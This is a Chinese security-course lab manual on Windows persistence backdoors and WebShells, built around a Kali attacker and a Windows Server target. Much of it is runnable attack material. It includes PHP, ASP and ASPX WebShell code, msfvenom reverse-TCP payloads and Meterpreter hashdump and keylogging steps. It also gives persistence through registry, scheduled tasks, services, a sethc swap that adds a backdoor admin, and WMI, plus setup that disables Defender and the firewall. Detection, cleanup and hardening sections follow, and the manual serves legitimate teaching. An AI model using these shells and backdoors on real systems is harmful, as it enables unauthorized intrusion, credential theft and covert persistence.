# 实验七：后门持久化与WebShell攻防

> 对应章节：项目七 Windows应用安全
实验目标：掌握 Windows 常见持久化方式（注册表/计划任务/服务/WMI/粘滞键）、WebShell 上传与检测思路，并完成后门排查与清除验证
预计用时：120分钟
难度等级：⭐⭐⭐（中级）
> 

---

# 第一部分：前置知识点

## 1. 持久化技术分类与原理

### 1.1 后门持久化技术全景图

```
攻击者获取初始访问权限后，需要维持对目标系统的长期控制能力。
持久化（Persistence）就是在目标系统上留下"后门"，确保即使初始入口被关闭，
仍然可以重新进入系统。

┌──────────────────────────────────────────────────────────────┐
│                  Windows 持久化技术分类                         │
├─────────────┬────────────────────────┬──────────┬──────────────┤
│ 技术类别    │ 实现方式               │ 触发时机 │ 检测难度   │
├─────────────┼────────────────────────┼──────────┼──────────────┤
│ 注册表后门  │ Run/RunOnce键值写入     │ 用户登录 │ ⭐⭐        │
│             │ Image File Execution    │ 开机启动 │ ⭐⭐        │
│             │ AppInit_DLLs           │ 进程加载 │ ⭐⭐⭐      │
├─────────────┼────────────────────────┼──────────┼──────────────┤
│ 计划任务    │ schtasks定时执行        │ 定时/登录│ ⭐⭐        │
│             │ 每分钟/每小时/每天      │          │             │
├─────────────┼────────────────────────┼──────────┼──────────────┤
│ 服务后门    │ sc create创建系统服务   │ 系统启动 │ ⭐⭐        │
│             │ 以SYSTEM权限运行        │          │             │
├─────────────┼────────────────────────┼──────────┼──────────────┤
│ WMI后门     │ 事件订阅触发恶意代码    │ WMI事件  │ ⭐⭐⭐⭐    │
│             │ 永久订阅+定期触发      │          │             │
├─────────────┼────────────────────────┼──────────┼──────────────┤
│ DLL劫持     │ 替换合法DLL为恶意DLL  │ 程序启动 │ ⭐⭐⭐      │
│             │ DLL搜索顺序利用         │          │             │
├─────────────┼────────────────────────┼──────────┼──────────────┤
│ 粘滞键后门  │ 替换sethc.exe为cmd.exe │ 登录界面 │ ⭐          │
│             │ 登录界面按5次Shift触发 │          │             │
├─────────────┼────────────────────────┼──────────┼──────────────┤
│ 文件关联劫持│ 修改文件类型关联       │ 打开文件 │ ⭐⭐        │
└─────────────┴────────────────────────┴──────────┴──────────────┘
```

### 1.2 注册表持久化路径详解

```
注册表是Windows持久化的最常用载体，以下路径是最常被利用的：

┌─ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│  作用域：所有用户
│  触发时机：所有用户登录时
│  示例：WindowsUpdate = "C:\Temp\update.exe"
│
├─ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
│  作用域：所有用户
│  触发时机：下次登录时运行一次（运行后自动删除）
│
├─ HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│  作用域：当前用户
│  触发时机：当前用户登录时
│
├─ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
│  作用域：所有用户
│  触发时机：用户登录（策略控制）
│
├─ HKLM\SYSTEM\CurrentControlSet\Services
│  作用域：系统级
│  触发时机：系统启动（服务形式）
│  示例：svchost.exe -k netsvcs → 实际加载的恶意DLL
│
└─ HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
   作用域：所有用户
   触发时机：进程启动时
   原理：通过SilentProcessExit/Debugger劫持合法进程
```

---

## 2. WebShell技术精讲

### 2.1 WebShell分类与特征

```
WebShell是以Web脚本形式存在于服务器上的恶意程序，通过HTTP请求远程控制服务器。

按功能分类：
┌──────────┬──────────────────────────────────────────────────┐
│ 类型     │ 特点                                               │
├──────────┼──────────────────────────────────────────────────┤
│ 小马     │ 功能单一，仅用于上传大马（文件上传功能）         │
│          │ 代码极短（5-20行），不易被WAF检测                │
│          │ 需要配合大马使用                                 │
├──────────┼──────────────────────────────────────────────────┤
│ 大马     │ 功能完整：文件管理+命令执行+数据库操作          │
│          │ 代表：冰蝎、哥斯拉、中国菜刀                     │
│          │ 通常有加密通信功能，绕过IDS/WAF               │
├──────────┼──────────────────────────────────────────────────┤
│ 一句话   │ 极简代码，配合客户端工具使用                    │
│          │ PHP: <?php @eval($_POST["cmd"]);?>              │
│          │ ASP: <%execute(request("cmd"))%>               │
│          │ ASPX: <script runat="server">eval...</script>  │
│          │ 客户端通过POST参数传递要执行的命令              │
└──────────┴──────────────────────────────────────────────────┘

一句话木马工作流程：
┌──────────┐     HTTP POST      ┌──────────┐
│ 攻击者    │ ────────────────► │  Web服务器│
│ (菜刀等) │  cmd=whoami     │           │
│          │                   │  IIS/    │
│          │ ◄─ 执行结果 ──────│  Apache  │
│          │  (HTML输出)      │  Nginx   │
└──────────┘                   └──────────┘
```

### 2.2 WebShell上传常见利用链

```
文件上传漏洞利用链：

1. 发现上传点 ──► 2. 绕过前端验证 ──► 3. 绕过后端验证
                                                    │
                                       ┌───────────────────────┤
                                       │ 绕过方式：           │
                                       │ • 修改Content-Type  │
                                       │ • 修改文件扩展名   │
                                       │ • 双写/00截断     │
                                       │ • 图片马           │
                                       │ • .htaccess解析   │
                                       │ • 竞争条件         │
                                       └───────────────────────┘
                                                    │
                                       4. 上传WebShell → 5. 访问WebShell URL
                                                    │
                                       6. 执行命令/上传大马
                                       7. 提权/横向移动
```

### 2.3 现代WebShell对抗技术

```
攻击者绕过检测的手段：
┌─────────────────────────────────────────────────┐
│ 冰蝎(Behinder)    │ JS加密通信，流量特征随机化    │
│ 哥斯拉(Godzilla)    │ 多种加密算法+动态密钥          │
│ 免杀技术            │ 加壳/混淆/分离加载/内存执行   │
│ 内存马(Fileless)    │ 不写磁盘，纯内存运行          │
│ 反序列化            │ 利用系统自带组件执行            │
└─────────────────────────────────────────────────┘

防御WebShell的手段：
┌─────────────────────────────────────────────────┐
│ 上传目录禁止执行权限（最有效）               │
│ WAF检测异常HTTP流量                        │
│ 文件完整性监控（FIM）                      │
│ RASP运行时自我保护                        │
│ 定期WebShell扫描（D盾/河马）               │
└─────────────────────────────────────────────────┘
```

---

## 3. Metasploit框架基础

### 3.1 Msfvenom Payload生成器

```
msfvenom 是 Metasploit 的 Payload 生成工具：

常用命令格式：
msfvenom -p <平台/类型> LHOST=<攻击IP> LPORT=<端口> -f <格式> -o <输出文件>

常用Payload类型：
┌───────────────────────────────┬──────────────────┐
│ Payload                      │ 适用场景          │
├───────────────────────────────┼──────────────────┤
│ windows/meterpreter/reverse_tcp│ Windows反弹Shell │
│ windows/x64/meterpreter/reverse_tcp│ Windows x64      │
│ windows/meterpreter/reverse_https│ HTTPS加密通道    │
│ php/meterpreter/reverse_tcp  │ PHP环境反弹       │
│ java/jsp_shell_reverse_tcp   │ JSP环境反弹       │
└───────────────────────────────┴──────────────────┘

常用输出格式：
-f exe     → Windows可执行文件
-f psh     → PowerShell脚本
-f psh-reflection → PowerShell无文件落地
-f dll     → DLL文件（用于DLL劫持）
-f aspx    → ASPX WebShell
```

> **实验关键提示**：本实验涵盖后门植入和 WebShell 两个主题。后门部分强调“植入—检测—清除”闭环；WebShell 部分强调“上传利用—检测—防护”闭环。最终目标是既理解攻击实现，也能完成防守验证。
> 

---

# 第二部分：实验操作

## 一、实验环境配置

### 1.1 网络拓扑

```
┌─────────────────────┐              NAT模式               ┌─────────────────────┐
│    Kali Linux       │           192.168.1.0/24             │  Windows Server     │
│   2025.4（攻击机）  │◄──────────────────────────────────►  │    2025（靶机）      │
│  IP: 192.168.1.10   │                                      │  IP: 192.168.1.20   │
└─────────────────────┘                                      └─────────────────────┘
```

### 1.2 靶机环境详细配置

**虚拟机设置**：

| 项目 | 配置 | 操作系统 | Windows Server 2025 Standard（桌面体验版） |
| --- | --- | --- | --- |
| 内存 | 4 GB | 硬盘 | 60 GB |
| 网络适配器 | NAT模式 | 快照 | 实验前创建快照（命名：实验七-初始状态） |

<aside>
⚠️

提示：本实验涉及 WebShell、木马与持久化技术，Windows Defender/EDR 可能会拦截样本或阻止执行。若在实验环境无法复现“上线/执行”现象，可将重点放在：持久化点位的创建/检测/清除与 IIS 上传目录“禁止脚本执行”的防护验证上。

</aside>

**靶机初始化脚本**（管理员PowerShell执行）：

```powershell
# ============================================
# 靶机环境初始化脚本 - 实验七
# ============================================

# 1. 安装IIS及ASP.NET支持
Install-WindowsFeature Web-Server, Web-Asp-Net45, Web-CGI, `
  Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Mgmt-Tools, `
  Web-Scripting-Tools -IncludeManagementTools

# 2. 创建网站目录结构
mkdir C:\inetpub\wwwroot\TargetApp
mkdir C:\inetpub\wwwroot\TargetApp\uploads

# 3. 部署测试页面
Set-Content -Path "C:\inetpub\wwwroot\TargetApp\index.html" -Value "<html><body><h1>Target Application</h1><p>Welcome</p></body></html>"
Set-Content -Path "C:\inetpub\wwwroot\TargetApp\uploads\readme.txt" -Value "Upload directory - files uploaded here"

# 4. 创建应用程序池和网站
Import-Module WebAdministration
New-WebAppPool -Name "TargetAppPool"
Stop-Website -Name "Default Web Site"
New-Website -Name "TargetApp" -Port 80 -PhysicalPath "C:\inetpub\wwwroot\TargetApp" -ApplicationPool "TargetAppPool"

# 5. 确保uploads目录允许脚本执行（故意制造漏洞）
# 默认IIS允许脚本执行，此处确认未限制
Set-WebConfigurationProperty -Filter "/system.webServer/handlers" `
  -PSPath "IIS:\Sites\TargetApp\uploads" -Name "accessPolicy" -Value "Read,Script"

# 6. 创建计划任务测试用户
net user taskuser Task@123 /add

# 7. 创建工具目录
mkdir C:\Tools
mkdir C:\Windows\Temp

# 8. 关闭 Windows Defender 实时防护（否则木马会被隔离）
Set-MpPreference -DisableRealtimeMonitoring $true

# 9. 关闭防火墙（仅实验环境）
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# 10. 启用WinRM远程管理（用于远程执行命令）
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# 11. 设置管理员密码（确保已知）
net user administrator P@ssw0rd123 /active:yes

Write-Host "实验七环境初始化完成！" -ForegroundColor Green
```

---

## 二、实验步骤

### 阶段一：WebShell上传与利用

**步骤1：生成各类WebShell**

```bash
# 在Kali攻击机上执行

# PHP一句话木马
echo '<?php @eval($_POST["cmd"]);?>' > /tmp/shell.php

# ASP一句话木马
echo '<%execute(request("cmd"))%>' > /tmp/shell.asp

# ASPX一句话木马（适配IIS）
cat > /tmp/shell.aspx << 'EOF'
<%@ Page Language="Jscript"%>
<%
var cmd = Request.Item["cmd"];
if(cmd != null){
    var wsh = new ActiveXObject("WScript.Shell");
    var oExec = wsh.Exec("cmd /c " + cmd);
    var output = oExec.StdOut.ReadAll();
    Response.Write("<pre>" + output + "</pre>");
}
%>
EOF

# 免杀ASPX木马（使用冰蝎/哥斯拉加密通信的格式，此处演示简单版本）
cat > /tmp/shell_encrypted.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        string key = Request.Headers["X-Authorization"];
        if (key != null) {
            byte[] data = Convert.FromBase64String(Request.Form["data"]);
            // 解密并执行（简化版，实际冰蝎使用AES加密）
            string cmd = System.Text.Encoding.UTF8.GetString(data);
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            Response.Write(p.StandardOutput.ReadToEnd());
        }
    }
</script>
EOF

# 小马（仅用于上传大马）
cat > /tmp/minishell.asp << 'EOF'
<%
Set fs = Server.CreateObject("Scripting.FileSystemObject")
If Request.QueryString("act")="upload" Then
    Set file = fs.CreateTextFile(Server.MapPath(".") & "\" & Request.Form("name"))
    file.Write Request.Form("content")
    file.Close
    Response.Write "OK"
End If
%>
<form method="POST" action="?act=upload">
Filename: <input name="name"><br>
Content: <textarea name="content"></textarea><br>
<input type="submit" value="Upload">
</form>
EOF
```

**步骤2：上传WebShell到靶机**

```
# 方法一：通过smbclient上传（模拟已获取SMB访问权限）
smbclient //192.168.1.20/C$ -U administrator -c "put /tmp/shell.aspx C:\\inetpub\\wwwroot\\TargetApp\\uploads\\test.aspx"

# 方法二：通过curl模拟上传（如果存在文件上传功能）
curl -X POST http://192.168.1.20/upload.asp -F "file=@/tmp/shell.aspx"

# 方法三：通过Meterpreter上传（获取会话后）
# meterpreter > upload /tmp/shell.aspx C:\inetpub\wwwroot\TargetApp\uploads\shell.aspx
```

**步骤3：验证WebShell可执行**

```
# 验证ASPX WebShell
curl -s "http://192.168.1.20/uploads/test.aspx" -d "cmd=whoami"
curl -s "http://192.168.1.20/uploads/test.aspx" -d "cmd=ipconfig"
curl -s "http://192.168.1.20/uploads/test.aspx" -d "cmd=net user"

# 预期：返回命令执行结果（运行身份取决于站点/应用池权限）
```

> **知识关联**：对应讲义中”WebShell分类”——一句话木马代码极短但功能强大，可通过文件上传漏洞部署到服务器上。
> 

---

### 阶段二：反弹木马生成与连接

**步骤4：使用msfvenom生成反弹木马**

```
# 生成Windows x64反弹Shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o /tmp/backdoor.exe

# 生成PowerShell格式（无文件落地，演示用）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh-reflection -o /tmp/backdoor.ps1

# 生成DLL（用于DLL劫持演示）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4455 -f dll -o /tmp/evil.dll

# 生成带编码的EXE（演示用）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o /tmp/backdoor_encoded.exe
```

**步骤5：在Kali上启动监听**

```
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run -j
```

**步骤6：将木马上传到靶机并执行**

```bash
# 通过SMB上传木马
smbclient //192.168.1.20/C$ -U administrator%'P@ssw0rd123' -c “put /tmp/backdoor.exe Windows\\Temp\\svchost_update.exe”

# 远程执行木马
crackmapexec smb 192.168.1.20 -u administrator -p 'P@ssw0rd123' -x “C:\Windows\Temp\svchost_update.exe”

# 或通过PsExec执行
/usr/share/doc/python3-impacket/examples/psexec.py administrator:'P@ssw0rd123'@192.168.1.20 -c /tmp/backdoor.exe
```

**步骤7：Meterpreter会话操作**

```bash
# 在Metasploit监听端获取Meterpreter会话
meterpreter > getuid
# nt authority\system

meterpreter > getsystem
# 已是SYSTEM权限

meterpreter > sysinfo
# Windows Server 2025

# 查看桌面截图
meterpreter > screenshot

# 获取密码哈希
meterpreter > hashdump

# 键盘记录
meterpreter > keyscan_start
# …等待一段时间…
meterpreter > keyscan_dump

# 上传/下载文件
meterpreter > upload /tmp/evil.dll C:\\Windows\\Temp\\
meterpreter > download C:\\inetpub\\wwwroot\\TargetApp\\web.config /tmp/

# 迁移进程（避免木马进程被杀）
meterpreter > ps
meterpreter > migrate <lsass.exe的PID>

# 端口转发
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.20
# 通过攻击机的8080端口访问靶机的80端口
```

> **知识关联**：对应讲义中”反弹木马（msfvenom + Meterpreter）“——msfvenom生成Payload，Meterpreter提供丰富的后渗透功能。
> 

---

### 阶段三：Windows持久化后门植入

**步骤8：注册表Run键持久化**

```bash
# 在Meterpreter中执行注册表持久化
meterpreter > reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v "WindowsUpdate" -d "C:\\Windows\\Temp\\svchost_update.exe"

# 或通过PowerShell远程执行
# 在靶机上执行：
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsUpdateHelper" -Value "C:\Windows\Temp\svchost_update.exe" -PropertyType String

# 验证持久化
meterpreter > reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v "WindowsUpdate"
```

**步骤9：计划任务持久化**

```powershell
# 在靶机上创建计划任务后门
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\svchost_update.exe" /sc onstart /ru SYSTEM /f
schtasks /create /tn "DiskCleanup" /tr "C:\Windows\Temp\svchost_update.exe" /sc daily /st 03:00 /ru SYSTEM /f
schtasks /create /tn "MemoryDiagnostic" /tr "C:\Windows\Temp\svchost_update.exe" /sc onlogon /ru taskuser /f

# 验证计划任务
schtasks /query /tn "SystemHealthCheck" /fo LIST /v
schtasks /query /tn "DiskCleanup" /fo LIST /v
schtasks /query /tn "MemoryDiagnostic" /fo LIST /v

# 立即手动运行测试
schtasks /run /tn "SystemHealthCheck"
```

> **知识关联**：对应讲义中”后门分类 - 计划任务后门”——计划任务在指定时间自动运行，可实现持久化访问。
> 

**步骤10：服务后门持久化**

```bash
# 在靶机上创建恶意服务
sc create "SystemDiagnostic" binpath= "C:\Windows\Temp\svchost_update.exe" start= auto displayname= "System Diagnostic Service"
sc description "SystemDiagnostic" "Monitors system health and performance metrics"
sc start "SystemDiagnostic"

# 验证服务
sc query SystemDiagnostic
sc qc SystemDiagnostic
```

**步骤11：粘滞键后门（sethc替换）**

```bash
# 在靶机上以管理员身份执行
# 备份原文件
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak

# 替换为cmd.exe（需要先获取文件所有权并修改权限）
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# 验证
# 在登录界面按5次Shift键 → 弹出cmd.exe（以SYSTEM权限运行）
# 在cmd中执行：net user backdoor Backdoor@123 /add & net localgroup administrators backdoor /add
```

> **知识关联**：对应讲义中”5次Shift后门”——替换sethc.exe为cmd.exe，在登录界面获得SYSTEM权限命令行。
> 

**步骤12：WMI事件订阅持久化（高级）**

```powershell
# WMI持久化通过WMI事件订阅实现，更难检测
# 在靶机上执行：

# 创建WMI事件过滤器（每60秒触发一次）
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name="SystemMonitor";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query}

# 创建事件消费者（执行命令）
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name="SystemUpdater";CommandLineTemplate="C:\Windows\Temp\svchost_update.exe";ExecutablePath="C:\Windows\Temp\svchost_update.exe"}

# 绑定过滤器和消费者
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer}

# 验证WMI持久化
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
```

---

### 阶段四：后门检测与清除

**步骤13：全面检测靶机上的后门**

```powershell
# 1. 检查注册表启动项
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# 2. 检查计划任务
schtasks /query /fo TABLE | findstr /V "Microsoft"
Get-ScheduledTask | Where-Object {$_.Author -notlike "Microsoft*"} | Format-Table TaskName, State, Author

# 3. 检查非标准服务
Get-Service | Where-Object {$_.DisplayName -like "*System*" -or $_.DisplayName -like "*Update*" -or $_.DisplayName -like "*Diagnostic*"} | Format-Table Name, DisplayName, Status, StartType

# 4. 检查sethc.exe是否被替换
Get-FileHash C:\Windows\System32\sethc.exe -Algorithm SHA256
Get-FileHash C:\Windows\System32\sethc.exe.bak -Algorithm SHA256
# 如果两个哈希不同 → 文件已被替换

# 5. 检查WMI事件订阅
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

# 6. 检查可疑网络连接
netstat -ano | findstr ESTABLISHED
Get-NetTCPConnection -State Established

# 7. 检查可疑进程
Get-Process | Where-Object {$_.Path -like "*Temp*" -or $_.Path -like "*Users*"} | Format-Table Name, Id, Path
```

**步骤14：清除所有后门**

```powershell
# 1. 删除注册表启动项
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue

# 2. 删除计划任务后门
schtasks /delete /tn "SystemHealthCheck" /f
schtasks /delete /tn "DiskCleanup" /f
schtasks /delete /tn "MemoryDiagnostic" /f

# 3. 删除服务后门
sc stop "SystemDiagnostic"
sc delete "SystemDiagnostic"

# 4. 恢复sethc.exe
copy /Y C:\Windows\System32\sethc.exe.bak C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /reset

# 5. 删除WMI事件订阅
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Remove-WmiObject

# 6. 删除木马文件
Remove-Item "C:\Windows\Temp\svchost_update.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\backdoor*" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\inetpub\wwwroot\TargetApp\uploads\*.aspx" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\inetpub\wwwroot\TargetApp\uploads\*.php" -Force -ErrorAction SilentlyContinue

# 7. 验证清除结果
Write-Host "=== 后门清除验证 ===" -ForegroundColor Green
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
schtasks /query /fo TABLE | findstr /V "Microsoft"
Get-Service "SystemDiagnostic" -ErrorAction SilentlyContinue
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
```

---

### 阶段五：WebShell检测

**步骤15：使用工具扫描WebShell**

```bash
# 在Kali上使用clamav扫描从靶机下载的Web目录
# 先下载整个网站目录
smbclient //192.168.1.20/C$ -U administrator%'P@ssw0rd123' -c “recurse; prompt OFF; lcd /tmp/site_backup; cd inetpub\\wwwroot\\TargetApp; mget *”

# 使用clamav扫描
clamscan -r /tmp/site_backup/ --detect-pua=yes

# 使用D盾WebShell查杀（Windows工具，在靶机上运行）
# 下载D盾：https://www.d99net.net/
# 扫描目录：C:\inetpub\wwwroot\TargetApp\
```

**步骤16：IIS安全加固防止WebShell**

```powershell
# 1. 上传目录禁止执行权限
# IIS管理器 → TargetApp网站 → uploads目录 → 功能视图 → 处理程序映射
# → "编辑功能权限" → 取消"脚本"权限，只保留"读取"

# 或通过PowerShell
Remove-WebConfigurationProperty -Filter "/system.webServer/handlers" `
    -PSPath "IIS:\Sites\TargetApp\uploads" -Name ".*" -ErrorAction SilentlyContinue

# 2. 配置请求筛选限制可上传的文件大小和类型
# IIS管理器 → TargetApp网站 → 请求筛选
#   文件大小限制 → 最大允许内容长度: 1MB
#   文件扩展名 → 拒绝 .php, .asp, .aspx, .exe, .bat

# 3. 启用IIS日志记录详细请求
Set-WebConfigurationProperty -Filter "/system.applicationHost/sites/siteDefaults/logFile" `
    -Name "logExtFileFlags" -Value "Date,Time,ClientIP,UserName,Method,UriStem,UriQuery,HttpStatus,TimeTaken,Referer,UserAgent"

# 4. 设置上传目录为只读（NTFS层面）
$acl = Get-Acl "C:\inetpub\wwwroot\TargetApp\uploads"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("IIS_IUSRS", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
$acl.SetAccessRule($rule)
Set-Acl "C:\inetpub\wwwroot\TargetApp\uploads" $acl
```

---

## 三、实验报告要求

| 序号 | 记录项 | 说明 |
| --- | --- | --- |
| 1 | WebShell利用过程 | 上传方式、连接方式、执行命令截图 |
| 2 | 持久化后门清单 | 注册表、计划任务、服务、WMI等全部后门 |
| 3 | 后门检测结果 | 各检测方法的发现结果 |
| 4 | 清除验证报告 | 清除后的二次检测确认 |
| 5 | WebShell防护建议 | IIS加固配置要点 |

### 思考题

1. 为什么上传目录必须禁止脚本执行权限？仅靠NTFS权限能否防止WebShell？
2. 对比各类持久化技术的优缺点（注册表 vs 计划任务 vs 服务 vs WMI）？
3. WMI事件订阅后门为什么比传统后门更难检测？
4. 现代EDR如何检测和防御以上后门技术？
5. 如果发现服务器已被植入后门，正确的应急响应流程是什么？

---

## 四、实验清理

```powershell
# 1. 卸载IIS
Uninstall-WindowsFeature -Name Web-Server, Web-Asp-Net45, Web-CGI, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Mgmt-Tools -IncludeManagementTools

# 2. 删除网站目录
Remove-Item "C:\inetpub\wwwroot\TargetApp" -Recurse -Force
Remove-Item "C:\Tools" -Recurse -Force

# 3. 删除测试用户
net user taskuser /delete

# 4. 禁用WinRM
Disable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "" -Force

# 5. 启用Windows Defender和防火墙
Set-MpPreference -DisableRealtimeMonitoring $false
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 6. 恢复快照（推荐，确保彻底清除）
```

> **免责声明**：本实验仅用于授权的安全教学环境。后门植入和WebShell利用技术在未授权系统上使用属于违法行为。
>